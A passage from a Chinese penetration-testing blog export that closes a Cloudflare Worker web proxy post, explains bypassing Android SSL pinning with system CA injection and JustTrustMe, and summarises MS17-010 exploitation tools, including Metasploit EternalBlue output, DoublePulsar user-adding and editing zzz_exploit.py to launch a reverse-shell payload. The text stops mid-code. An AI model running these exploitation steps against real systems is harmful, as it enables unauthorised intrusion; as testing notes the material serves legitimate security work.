class=\"string\">&#x27;content-language&#x27;</span> &amp;&amp;</span><br><span class=\"line\">      k !== <span class=\"string\">&#x27;content-type&#x27;</span> &amp;&amp;</span><br><span class=\"line\">      k !== <span class=\"string\">&#x27;expires&#x27;</span> &amp;&amp;</span><br><span class=\"line\">      k !== <span class=\"string\">&#x27;last-modified&#x27;</span> &amp;&amp;</span><br><span class=\"line\">      k !== <span class=\"string\">&#x27;pragma&#x27;</span></span><br><span class=\"line\">    ) &#123;</span><br><span class=\"line\">      expose = expose + <span class=\"string\">&#x27;,&#x27;</span> + k</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (acehOld) &#123;</span><br><span class=\"line\">    expose = expose + <span class=\"string\">&#x27;,--s&#x27;</span></span><br><span class=\"line\">    resHdrNew.set(<span class=\"string\">&#x27;--t&#x27;</span>, <span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">// verify</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (rawLen) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> newLen = resHdrOld.get(<span class=\"string\">&#x27;content-length&#x27;</span>) || <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"keyword\">const</span> badLen = (rawLen !== newLen)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (badLen) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (retryTimes &lt; MAX_RETRY) &#123;</span><br><span class=\"line\">        urlObj = <span class=\"keyword\">await</span> parseYtVideoRedir(urlObj, newLen, res)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (urlObj) &#123;</span><br><span class=\"line\">          <span class=\"keyword\">return</span> proxy(urlObj, reqInit, acehOld, rawLen, retryTimes + <span class=\"number\">1</span>)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      <span class=\"keyword\">return</span> makeRes(res.body, <span class=\"number\">400</span>, &#123;</span><br><span class=\"line\">        <span class=\"string\">&#x27;--error&#x27;</span>: <span class=\"string\">`bad len: <span class=\"subst\">$&#123;newLen&#125;</span>, except: <span class=\"subst\">$&#123;rawLen&#125;</span>`</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;access-control-expose-headers&#x27;</span>: <span class=\"string\">&#x27;--error&#x27;</span>,</span><br><span class=\"line\">      &#125;)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (retryTimes &gt; <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">      resHdrNew.set(<span class=\"string\">&#x27;--retry&#x27;</span>, retryTimes)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">let</span> status = res.status</span><br><span class=\"line\"></span><br><span class=\"line\">  resHdrNew.set(<span class=\"string\">&#x27;access-control-expose-headers&#x27;</span>, expose)</span><br><span class=\"line\">  resHdrNew.set(<span class=\"string\">&#x27;access-control-allow-origin&#x27;</span>, <span class=\"string\">&#x27;*&#x27;</span>)</span><br><span class=\"line\">  resHdrNew.set(<span class=\"string\">&#x27;--s&#x27;</span>, status)</span><br><span class=\"line\">  resHdrNew.set(<span class=\"string\">&#x27;--ver&#x27;</span>, JS_VER)</span><br><span class=\"line\"></span><br><span class=\"line\">  resHdrNew.delete(<span class=\"string\">&#x27;content-security-policy&#x27;</span>)</span><br><span class=\"line\">  resHdrNew.delete(<span class=\"string\">&#x27;content-security-policy-report-only&#x27;</span>)</span><br><span class=\"line\">  resHdrNew.delete(<span class=\"string\">&#x27;clear-site-data&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (status === <span class=\"number\">301</span> ||</span><br><span class=\"line\">      status === <span class=\"number\">302</span> ||</span><br><span class=\"line\">      status === <span class=\"number\">303</span> ||</span><br><span class=\"line\">      status === <span class=\"number\">307</span> ||</span><br><span class=\"line\">      status === <span class=\"number\">308</span></span><br><span class=\"line\">  ) &#123;</span><br><span class=\"line\">    status = status + <span class=\"number\">10</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> Response(res.body, &#123;</span><br><span class=\"line\">    status,</span><br><span class=\"line\">    headers: resHdrNew,</span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;URL&#125;</span> </span>urlObj </span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">isYtUrl</span>(<span class=\"params\">urlObj</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> (</span><br><span class=\"line\">    urlObj.host.endsWith(<span class=\"string\">&#x27;.googlevideo.com&#x27;</span>) &amp;&amp;</span><br><span class=\"line\">    urlObj.pathname.startsWith(<span class=\"string\">&#x27;/videoplayback&#x27;</span>)</span><br><span class=\"line\">  )</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;URL&#125;</span> </span>urlObj </span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;number&#125;</span> </span>newLen </span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param <span class=\"type\">&#123;Response&#125;</span> </span>res </span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">parseYtVideoRedir</span>(<span class=\"params\">urlObj, newLen, res</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (newLen &gt; <span class=\"number\">2000</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!isYtUrl(urlObj)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">const</span> data = <span class=\"keyword\">await</span> res.text()</span><br><span class=\"line\">    urlObj = <span class=\"keyword\">new</span> URL(data)</span><br><span class=\"line\">  &#125; <span class=\"keyword\">catch</span> (err) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!isYtUrl(urlObj)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> urlObj</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>点击deploy后，会生成一个worker.dev的域名</p>\n<h1 id=\"0x02-设置域名\"><a href=\"#0x02-设置域名\" class=\"headerlink\" title=\"0x02 设置域名\"></a>0x02 设置域名</h1><p>设置ns解析，将自己的域名ns解析到cloudflare提供的域名上，即可完成</p>\n<p>该种方式其实还可以直接代理一些其他网站，比如google，youtube等等，只需要修改代理网址即可。</p>\n","categories":["杂文"],"tags":["cdn"]},{"title":"bypass android ssl pinning","url":"http://blog.le31ei.top/2020/08/19/bypass-android-ssl-pinning/","content":"<p>在做app测试的时候，经常有抓不到包的情况，即使是导入了burp证书后，仍然无法抓取https的数据包，这种情况一般是遇到了ssl pinning。</p>\n<h1 id=\"0x01-替换系统证书\"><a href=\"#0x01-替换系统证书\" class=\"headerlink\" title=\"0x01 替换系统证书\"></a>0x01 替换系统证书</h1><p>在android 7.0以前，系统导入burp证书为用户权限能够绕过部分未做证书校验的APP，但是7.0及以后应用默认不再信任用户证书，导入burp证书后仍然会提示证书错误，抓不到https的包。</p>\n<p>这种情况下一般采用替换系统证书的方法，原理是将burp的证书直接导入为系统证书，前提是手机需要ROOT权限。导入后系统会把burp当成系统证书，自然就能中间人代理https流量了。</p>\n<p>具体步骤如下：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 下载burp证书，导出为cacert.der，然后转换为pem格式</span></span><br><span class=\"line\">openssl x509 -inform DER -outform PEM -in cacert.der -out cacert.pem</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 生成<span class=\"built_in\">hash</span>，得到一个<span class=\"built_in\">hash</span>  比如：9a5ba575</span></span><br><span class=\"line\">openssl x509 -subject_hash_old -in cacert.pem</span><br><span class=\"line\">mv cacert.pem 9a5ba575.0</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 上传为系统证书</span></span><br><span class=\"line\">adb push 9a5ba575.0 /system/etc/security/cacerts/</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 如果在push过程中显示<span class=\"built_in\">readonly</span> system，则需要remount</span></span><br><span class=\"line\">adb disable-verity</span><br><span class=\"line\">adb root</span><br><span class=\"line\">adb remount</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>系统证书的目录是：/system/etc/security/cacerts/ 每个证书的命名规则为：. Certificate_Hash 表示证书文件的 hash 值，Number 是为了防止证书文件的 hash 值一致而增加的后缀; 证书的 hash 值可以由命令计算出来，在终端输入 openssl x509 -subject_hash_old -in ，其中 Certificate_File 为证书路径，将证书重命名为 hash.0 放入系统证书目录，之后你就可以正常抓包了。</p>\n</blockquote>\n<h1 id=\"0x02-Magisk-Always-Trust-User\"><a href=\"#0x02-Magisk-Always-Trust-User\" class=\"headerlink\" title=\"0x02 Magisk+Always Trust User\"></a>0x02 Magisk+Always Trust User</h1><p>上述应用不认用户证书的解决方案还有一种，就是magisk加上<a href=\"https://github.com/NVISO-BE/MagiskTrustUserCerts\">MagiskTrustUserCerts</a>。magisk类似于xposed框架，能够hook系统函数，<code>AlwaysTrustUserCerts</code>是该工具的一个插件，能够将用户导入的证书变成系统证书。</p>\n<p><img src=\"/2020/08/19/bypass-android-ssl-pinning/image-20200820102936183.png\" alt=\"image-20200820102936183.png\"></p>\n<p>在安装好后，进行正常的证书导入操作，证书就能直接导入到系统证书里边，较第一种方式方便许多。</p>\n<p>该种方式可以通过recovery将Magisk刷入未root的系统中，可以绕过一些检测了root权限的应用。</p>\n<h1 id=\"0x03-JustTrustMe\"><a href=\"#0x03-JustTrustMe\" class=\"headerlink\" title=\"0x03 JustTrustMe\"></a>0x03 JustTrustMe</h1><p>在经过上述两种方法后，大部分的app都能抓到包了，但是还是能碰到少数情况仍然抓不到包，应用连不上网的情况。这种情况一般都是ssl pinning的场景。</p>\n<p>应用中的代码对ssl证书进行了锁定。一般这种方法的思路就是通过xposed或者frida等hook框架对相应的证书验证代码hook进行绕过。一般app通常采用通用的解决方案，而xposed框架的JustTrustMe模块基本覆盖了这些类型，故本文不再探讨基于frida的自定义hook函数。</p>\n<p><strong>安装</strong>：</p>\n<p>安装方式比较简单，直接下载apk模块文件<a href=\"https://github.com/Fuzion24/JustTrustMe\">JustTrustMe</a>，按照通用的apk文件安装方式。然后在Xposed框架中进行激活，然后重启生效。</p>\n<p><img src=\"/2020/08/19/bypass-android-ssl-pinning/image-20200820104447189.png\" alt=\"image-20200820104447189\"></p>\n<p>安装好后，再抓包，应用就能正常运行并抓取https数据包了。</p>\n<h1 id=\"0x04-刷机\"><a href=\"#0x04-刷机\" class=\"headerlink\" title=\"0x04 刷机\"></a>0x04 刷机</h1><p>在进行上述步骤操作时会碰到一些刷机问题，这里简单记录一下。</p>\n<p><strong>BL锁</strong>：现在的手机一般有BL锁（BootLoader锁），如果需要刷入第三方recovery或者第三方ROM</p>\n<p><strong>FastBoot</strong>：线刷时需要进入的模式，通过fastboot命令可以刷入recovery。</p>\n<p>fastboot刷入的命令如下：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 查看设备</span></span><br><span class=\"line\">fastboot devices</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 刷入recovery</span></span><br><span class=\"line\">fastboot flash recovery recovery.img</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 从新的boot启动</span></span><br><span class=\"line\">fastboot boot recovery.img</span><br></pre></td></tr></table></figure>\n\n<p>附件是windows版本的fastboot工具：<a href=\"./fastboot.exe\">fastboot.exe</a></p>\n<p><strong>TWRP</strong>：第三方recovery，相对于官方的recovery增加了很多功能，可通过该recovery进行卡刷升级等。可刷入xposed框架、Magisk框架等</p>\n<h1 id=\"0x05-流量代理\"><a href=\"#0x05-流量代理\" class=\"headerlink\" title=\"0x05 流量代理\"></a>0x05 流量代理</h1><p>在做了以上操作后仍然有一种情况抓不到流量，就是应用不走配置代理。这种情况的解决思路是需要一个全局的代理工具，如内网渗透用到的proxychains或者proxifier，让所有的流量走统一的代理，然后使用burp抓包。因为默认的burp只能代理http流量，无法代理sock5，所以需要用到一个app工具：<a href=\"./Drony_100.apk\">drony.apk</a></p>\n<p>通过该工具可以配置代理流量，直接将手机的所有流量全局代理到burp上，这样就能抓包了。</p>\n<p>具体使用方法比较简单，可自行搜索查询，不再赘述。</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><ol>\n<li><p><a href=\"https://zhuanlan.zhihu.com/p/127847550\">Android应用中https SSL pinning以及绕过的方法介绍</a></p>\n</li>\n<li><p><a href=\"https://www.mcafee.com/enterprise/en-us/assets/misc/ms-android-7-10-ssl-pinning-bypass.pdf\">Android SSL Pinning Bypass: Android 7-10</a></p>\n</li>\n<li><p><a href=\"https://github.com/Fuzion24/JustTrustMe\">JustTrustMe</a></p>\n</li>\n<li><p><a href=\"https://xz.aliyun.com/t/2440\">SSL Pinning Practice</a></p>\n</li>\n<li><p><a href=\"https://xz.aliyun.com/t/2336\">Frida.Android.Practice (ssl unpinning)</a></p>\n</li>\n</ol>\n","categories":["Pentest"],"tags":["app测试"]},{"title":"ms17010工具总结","url":"http://blog.le31ei.top/2020/08/18/ms17010工具总结/","content":"<p>本文记录下实战中用到的ms17010的利用工具，实战中用过众多工具，都是哪个能成功就用哪个，还未做系统总结。本文记录下使用记录，做个总结备忘。</p>\n<h1 id=\"0x01-msf\"><a href=\"#0x01-msf\" class=\"headerlink\" title=\"0x01 msf\"></a>0x01 msf</h1><p>第一个工具当属大家熟悉<code>ms17_010_eternalblue</code>工具，集成在msf当中。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msf5 &gt; search 17-010</span><br><span class=\"line\"></span><br><span class=\"line\">Matching Modules</span><br><span class=\"line\">================</span><br><span class=\"line\"></span><br><span class=\"line\">   <span class=\"comment\">#  Name                                           Disclosure Date  Rank     Check  Description</span></span><br><span class=\"line\">   -  ----                                           ---------------  ----     -----  -----------</span><br><span class=\"line\">   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution</span><br><span class=\"line\">   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection</span><br><span class=\"line\">   2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption</span><br><span class=\"line\">   3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption <span class=\"keyword\">for</span> Win8+</span><br><span class=\"line\">   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution</span><br><span class=\"line\">   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>其中<code>smb_doublepulsar_rce</code>工具是使用nsa利用工具后留下的后门，可以用此工具反弹meterpreter。一般在内网中优先使用<code>auxiliary/scanner/smb/smb_ms17_010</code>扫描漏洞是否存在后再利用工具进行攻击。</p>\n<p>使用如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msf5 &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br><span class=\"line\">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; show options </span><br><span class=\"line\"></span><br><span class=\"line\">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br><span class=\"line\"></span><br><span class=\"line\">   Name           Current Setting  Required  Description</span><br><span class=\"line\">   ----           ---------------  --------  -----------</span><br><span class=\"line\">   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax <span class=\"string\">&#x27;file:&lt;path&gt;&#x27;</span></span><br><span class=\"line\">   RPORT          445              yes       The target port (TCP)</span><br><span class=\"line\">   SMBDomain      .                no        (Optional) The Windows domain to use <span class=\"keyword\">for</span> authentication</span><br><span class=\"line\">   SMBPass                         no        (Optional) The password <span class=\"keyword\">for</span> the specified username</span><br><span class=\"line\">   SMBUser                         no        (Optional) The username to authenticate as</span><br><span class=\"line\">   VERIFY_ARCH    <span class=\"literal\">true</span>             yes       Check <span class=\"keyword\">if</span> remote architecture matches exploit Target.</span><br><span class=\"line\">   VERIFY_TARGET  <span class=\"literal\">true</span>             yes       Check <span class=\"keyword\">if</span> remote OS matches exploit Target.</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Payload options (windows/x64/meterpreter/reverse_https):</span><br><span class=\"line\"></span><br><span class=\"line\">   Name      Current Setting  Required  Description</span><br><span class=\"line\">   ----      ---------------  --------  -----------</span><br><span class=\"line\">   EXITFUNC  thread           yes       Exit technique (Accepted: <span class=\"string\">&#x27;&#x27;</span>, seh, thread, process, none)</span><br><span class=\"line\">   LHOST     172.16.26.213    yes       The <span class=\"built_in\">local</span> listener hostname</span><br><span class=\"line\">   LPORT     8443             yes       The <span class=\"built_in\">local</span> listener port</span><br><span class=\"line\">   LURI                       no        The HTTP Path</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Exploit target:</span><br><span class=\"line\"></span><br><span class=\"line\">   Id  Name</span><br><span class=\"line\">   --  ----</span><br><span class=\"line\">   0   Windows 7 and Server 2008 R2 (x64) All Service Packs</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; <span class=\"built_in\">set</span> rhosts 172.16.26.238</span><br><span class=\"line\">rhosts =&gt; 172.16.26.238</span><br><span class=\"line\">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; run</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Started HTTPS reverse handler on https://172.16.26.213:8443</span><br><span class=\"line\">[*] 172.16.26.238:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class=\"line\">[+] 172.16.26.238:445     - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Enterprise 7601 Service Pack 1 x64 (64-bit)</span><br><span class=\"line\">[*] 172.16.26.238:445     - Scanned 1 of 1 hosts (100% complete)</span><br><span class=\"line\">[*] 172.16.26.238:445 - Connecting to target <span class=\"keyword\">for</span> exploitation.</span><br><span class=\"line\">[+] 172.16.26.238:445 - Connection established <span class=\"keyword\">for</span> exploitation.</span><br><span class=\"line\">[+] 172.16.26.238:445 - Target OS selected valid <span class=\"keyword\">for</span> OS indicated by SMB reply</span><br><span class=\"line\">[*] 172.16.26.238:445 - CORE raw buffer dump (53 bytes)</span><br><span class=\"line\">[*] 172.16.26.238:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2</span><br><span class=\"line\">[*] 172.16.26.238:445 - 0x00000010  30 30 38 20 52 32 20 45 6e 74 65 72 70 72 69 73  008 R2 Enterpris</span><br><span class=\"line\">[*] 172.16.26.238:445 - 0x00000020  65 20 37 36 30 31 20 53 65 72 76 69 63 65 20 50  e 7601 Service P</span><br><span class=\"line\">[*] 172.16.26.238:445 - 0x00000030  61 63 6b 20 31                                   ack 1           </span><br><span class=\"line\">[+] 172.16.26.238:445 - Target arch selected valid <span class=\"keyword\">for</span> arch indicated by DCE/RPC reply</span><br><span class=\"line\">[*] 172.16.26.238:445 - Trying exploit with 12 Groom Allocations.</span><br><span class=\"line\">[*] 172.16.26.238:445 - Sending all but last fragment of exploit packet</span><br><span class=\"line\">[*] 172.16.26.238:445 - Starting non-paged pool grooming</span><br><span class=\"line\">[+] 172.16.26.238:445 - Sending SMBv2 buffers</span><br><span class=\"line\">[+] 172.16.26.238:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class=\"line\">[*] 172.16.26.238:445 - Sending final SMBv2 buffers.</span><br><span class=\"line\">[*] 172.16.26.238:445 - Sending last fragment of exploit packet!</span><br><span class=\"line\">[*] 172.16.26.238:445 - Receiving response from exploit packet</span><br><span class=\"line\">[+] 172.16.26.238:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class=\"line\">[*] 172.16.26.238:445 - Sending egg to corrupted connection.</span><br><span class=\"line\">[*] 172.16.26.238:445 - Triggering free of corrupted buffer.</span><br><span class=\"line\">[-] 172.16.26.238:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class=\"line\">[-] 172.16.26.238:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class=\"line\">[-] 172.16.26.238:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br></pre></td></tr></table></figure>\n\n<p>该工具的利用成功率并不高，对目标系统版本要求较高，需要为win7或者winserver2008 r2，但结合msf的meterpreter进行流量代理，先在内网中过一遍c段倒是挺好的。</p>\n<h1 id=\"0x02-fcstools\"><a href=\"#0x02-fcstools\" class=\"headerlink\" title=\"0x02  fcstools\"></a>0x02  fcstools</h1><p>适用于在内网中，服务器无法出外网或者反弹到shell的情况，能够直接执行命令，如在目标机器添加用户等。一般msf等工具都是直接反弹meterpreter，如果目标机在无法出外网或者反弹的情况就只能使用这个离线工具。</p>\n<p>该工具需要配合DLL生成工具进行，替换掉x86或者x64文件，fcstools就会执行相关的dll命令。</p>\n<p><img src=\"/2020/08/18/ms17010%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20200818130214827.png\" alt=\"image-20200818130214827\"></p>\n<p>生成dll后，替换fcstools里面的x86或者x64文件，<strong>注意添加用户时，密码要满足系统的复杂度要求</strong>。</p>\n<p>.<img src=\"/2020/08/18/ms17010%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20200818130320705.png\" alt=\"image-20200818130320705\"></p>\n<p>然后就可以运行工具进行攻击了，</p>\n<p><img src=\"/2020/08/18/ms17010%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20200818130946475.png\" alt=\"image-20200818130946475\"></p>\n<p>eternalblue工具种下后门后，点击doublepulsar，利用后门执行dll里面的命令</p>\n<p><img src=\"/2020/08/18/ms17010%E5%B7%A5%E5%85%B7%E6%80%BB%E7%BB%93/image-20200818131312293.png\" alt=\"image-20200818131312293\"></p>\n<h1 id=\"0x03-zzz-exploit-py\"><a href=\"#0x03-zzz-exploit-py\" class=\"headerlink\" title=\"0x03 zzz_exploit.py\"></a>0x03 zzz_exploit.py</h1><p>github地址：<a href=\"https://github.com/worawit/MS17-010\">https://github.com/worawit/MS17-010</a></p>\n<p>该脚本有几个关键点需要注意：</p>\n<ol>\n<li>需要有一个系统可登陆的smb账户，可通过爆破等方式获取</li>\n</ol>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">USERNAME = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">PASSWORD = <span class=\"string\">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li><code>python zzz_exploit.py &lt;ip&gt; [pipe_name]</code>，需要有一个管道名。常见的管道名如下：</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">netlogon lsarpc samr browser atsvc DAV RPC SERVICE epmapper eventlog InitShutdown keysvc lsass LSM_API_service ntsvcs plugplay protected_storage router SapiServerPipeS-1-5-5-0-70123 scerpc srvsvc tapsrv trkwks W32TIME_ALT wkssvc PIPE_EVENTROOT\\CIMV2SCM EVENT PROVIDER db2remotecmd </span><br></pre></td></tr></table></figure>\n\n<p>3、默认的脚本是在c盘创建一个pwn.txt文件，需要修改为cs或者msf生成的执行文件，就能反弹</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">smb_pwn</span>(<span class=\"params\">conn, arch</span>):</span></span><br><span class=\"line\">    smbConn = conn.get_smbconnection()</span><br><span class=\"line\">    </span><br><span class=\"line\">    print(<span class=\"string\">&#x27;creating file c:\\\\pwned.txt on the target&#x27;</span>)</span><br><span class=\"line\">    tid2 = smbConn.connectTree(<span class=\"string\">&#x27;C$&#x27;</span>)</span><br><span class=\"line\">    fid2 = smbConn.createFile(tid2, <span class=\"string\">&#x27;/pwned.txt&#x27;</span>)</span><br><span class=\"line\">    smbConn.closeFile(tid2, fid2)</span><br><span class=\"line\">    smbConn.disconnectTree(tid2)</span><br></pre></td></tr></table></figure>\n\n<p>可改为如下代码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span 